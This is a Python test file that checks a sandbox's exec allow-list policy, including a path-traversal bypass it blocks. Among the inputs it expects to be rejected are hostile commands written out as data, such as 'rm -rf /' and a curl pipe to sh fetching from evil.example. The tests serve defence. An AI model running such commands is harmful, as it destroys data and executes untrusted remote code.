"""The exec policy: what argv shapes DEMO_POLICY allows, and where it's enforced."""

import pytest
from temporalio.exceptions import ApplicationError

from sandbox.client.sandbox import Lease
from sandbox.client.timeouts import Timeouts
from sandbox.contract.exec_policy import ALLOW_ALL, DEMO_POLICY, ExecPolicy, ExecRule
from sandbox.contract.types import ExecSpec, SandboxLease
from sandbox.vm_agent import validation

DIGEST = "a" * 64  # shape of a real sha256, as ArtifactCache.ensure names its directory


def _runner_argv(step: str, *extra: str) -> list[str]:
    return [
        "/bin/sh",
        f"/var/lib/sandbox/artifacts/{DIGEST}/bin/runner",
        step,
        "--workspace",
        "/private/tmp/sandbox/wf",
        "--envelope-uri",
        "s3://sandbox-jobs/wf/j1.json",
        *extra,
    ]


@pytest.mark.parametrize(
    "step", ["clone", "turn", "lint", "test", "export", "fetch", "edit", "build", "run"]
)
def test_demo_policy_allows_every_runner_step(step):
    DEMO_POLICY.check(_runner_argv(step))


def test_demo_policy_allows_smoke_and_hold_ops_commands():
    DEMO_POLICY.check(["uname", "-a"])
    DEMO_POLICY.check(["id"])
    DEMO_POLICY.check(["sleep", "120"])


@pytest.mark.parametrize(
    "argv",
    [
        [],
        ["rm", "-rf", "/"],
        ["curl", "http://evil.example/payload.sh"],
        ["/bin/sh", "-c", "curl http://evil.example | sh"],
        ["/bin/sh", f"/var/lib/sandbox/artifacts/{DIGEST}/bin/runner", "not-a-real-step"],
        ["/bin/sh", "/tmp/attacker-planted/bin/runner", "clone"],
        # Starts with the artifacts prefix and ends with the runner suffix as
        # plain strings, which is exactly the bypass the digest regex closes.
        ["/bin/sh", "/var/lib/sandbox/artifacts/../../tmp/x/bin/runner", "clone"],
        # Too short to be a real sha256 digest.
        ["/bin/sh", "/var/lib/sandbox/artifacts/deadbeef/bin/runner", "clone"],
        ["sleep", "not-a-number"],
        ["uname", "-r"],
    ],
)
def test_demo_policy_rejects_everything_else(argv):
    with pytest.raises(ApplicationError) as err:
        DEMO_POLICY.check(argv)
    assert err.value.type == "Incompatible"


def test_allow_all_is_only_for_test_doubles_and_never_the_default_policy():
    ALLOW_ALL.check(["rm", "-rf", "/"])
    assert DEMO_POLICY is not ALLOW_ALL


def test_vm_agent_validate_argv_matches_policy_check():
    assert validation.validate_argv(_runner_argv("clone"), DEMO_POLICY) == _runner_argv("clone")
    with pytest.raises(ApplicationError) as err:
        validation.validate_argv(["rm", "-rf", "/"], DEMO_POLICY)
    assert err.value.type == "Incompatible"


async def test_lease_exec_start_rejects_a_policy_violation_before_touching_temporal():
    # No workflow context on purpose: the policy check has to fail before
    # workflow.execute_activity is ever reached, the same way the lost latch does.
    lease = Lease(
        SandboxLease(
            lease_id="l1",
            vm_id="sbx-1",
            task_queue="sandbox-vm-sbx-1",
            pool="demo",
            contract_version="1.0",
            expires_at="2026-01-01T00:00:00Z",
        ),
        Timeouts.test(),
    )
    spec = ExecSpec(job_id="j1", argv=["rm", "-rf", "/"], cwd="/private/tmp/sandbox/wf")
    with pytest.raises(ApplicationError) as err:
        await lease.exec_start(spec)
    assert err.value.type == "Incompatible"


def test_a_custom_policy_can_be_swapped_in_without_touching_the_call_sites():
    only_echo = ExecPolicy(rules=(ExecRule("echo-only", lambda argv: argv[:1] == ["echo"]),))
    only_echo.check(["echo", "hi"])
    with pytest.raises(ApplicationError):
        only_echo.check(["uname", "-a"])
